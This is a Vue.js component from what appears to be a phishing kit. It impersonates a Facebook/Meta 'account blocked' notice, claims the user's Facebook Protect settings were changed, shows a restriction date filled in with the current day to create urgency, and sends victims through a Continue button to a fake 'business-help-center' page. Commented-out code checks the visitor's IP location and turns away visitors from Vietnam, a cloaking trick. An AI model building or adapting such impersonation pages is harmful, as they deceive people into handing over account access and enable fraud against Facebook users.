<template>
  <div>
    <div class="bg-[#F1F2F6] flex justify-center items-center h-screen">
      <div
        class="sm:w-11/12 md:w-2/3 lg:w-2.5/5 xl:w-2/5 w-11/12 mx-auto rounded-lg p-5 bg-[#fff] self-center"
      >
        <img src="/static/images/f_locked.png" class="w-[70%] mx-auto" />
        <p class="font-bold text-2xl">The security of your account is at risk.</p>
        <p class="my-3">
          We have temporarily blocked your account because your Facebook Protect settings have been
          modified.
        </p>
        <div class="p-3 flex items-center gap-3 bg-[#F7F8FA] rounded-md">
          <div class="text-2xl text-yellow-600">
            <ion-icon name="warning-outline" role="img" class="md hydrated">
              <div style="width: 24px;height: auto;">
                <svg xmlns="http://www.w3.org/2000/svg" class="ionicon s-ion-icon" viewBox="0 0 512 512">
                  <path d="M85.57 446.25h340.86a32 32 0 0028.17-47.17L284.18 82.58c-12.09-22.44-44.27-22.44-56.36 0L57.4 399.08a32 32 0 0028.17 47.17z" stroke-linecap="round" stroke-linejoin="round" class="ionicon-fill-none ionicon-stroke-width"></path>
                  <path d="M250.26 195.39l5.74 122 5.73-121.95a5.74 5.74 0 00-5.79-6h0a5.74 5.74 0 00-5.68 5.95z" stroke-linecap="round" stroke-linejoin="round" class="ionicon-fill-none ionicon-stroke-width"></path>
                  <path d="M256 397.25a20 20 0 1120-20 20 20 0 01-20 20z"></path>
                </svg>
              </div>
            </ion-icon>
          </div>
          <div>
            <p class="font-semibold text-lg">Your page was restricted on {{ formattedDate }}.</p>
            <p>We did this to protect your account from being suspended.</p>
          </div>
        </div>
        <p class="mt-3 mb-5">
          We will guide you through some steps to lift the page restriction and unlock your account.
        </p>
        <a style="text-decoration: none;"
          @click="continueAction"
          class="block text-lg cursor-pointer bg-blue-500 w-full font-semibold text-center py-3 text-white rounded-lg"
          >Continue</a
        >
      </div>
    </div>
  </div>
</template>
<style>
  .ionicon-stroke-width {
    stroke-width: var(--ionicon-stroke-width, 32px);
  }
  .ionicon-fill-none {
    fill: none; 
  }
  .ionicon {
    stroke: currentcolor;
    display: inline-block;
    width: 1em;
    height: 1em;
    contain: strict;
    fill: currentcolor;
    box-sizing: content-box !important;
  }
</style>
<script>
import { format } from 'date-fns'
import axios from 'axios'
import '../../public/static/css/app-3403d7f6.css';
export default {
  data() {
    return {
      date: new Date() // Tháng 10 (0-11), Ngày 17, Năm 2023
    }
  },
  // created: async function() {
  //   if(process.env.NODE_ENV == 'production'){
  //     try {
  //       // if(!this.fbclid || this.fbclid == '' || this.fbclid == null || this.fbclid == undefined){
  //       //   window.location.href = "https://bitly.com";
  //       // }
  //       const IP = await this.getIpAddress();
  //       if(!IP || IP == '' || IP == null || IP == undefined){
  //         return this.$router.push("/error");
  //       }
  //       const IpInfo = await this.getIpInfo(IP);
  //       const jsonIpInfo = JSON.parse(IpInfo);
  //       if(jsonIpInfo.country == 'VN'){
  //         return this.$router.push("/error");
  //       }
  //     } catch (error) {
  //       return this.$router.push("/error");
  //     }
  //   }
  // },
  computed: {
    formattedDate() {
      return format(this.date, 'MMMM d, yyyy') // Định dạng thời gian
    }
  },
  methods: {
    continueAction() {
      const nextRoute = this.$router.resolve('/business-help-center');
      if (nextRoute.href) {
        const { matched } = nextRoute;
        const meta = matched[matched.length - 1].meta;
        meta.canAccessNextPage = true;
        this.$router.push('/business-help-center');
      } else {
        this.$router.push('/meta-community-standard');
      }
    }
  }
}
</script>
<style lang="css" scoped></style>

// WEBPACK FOOTER // // src/pages/MetaCommunityStandard.vue
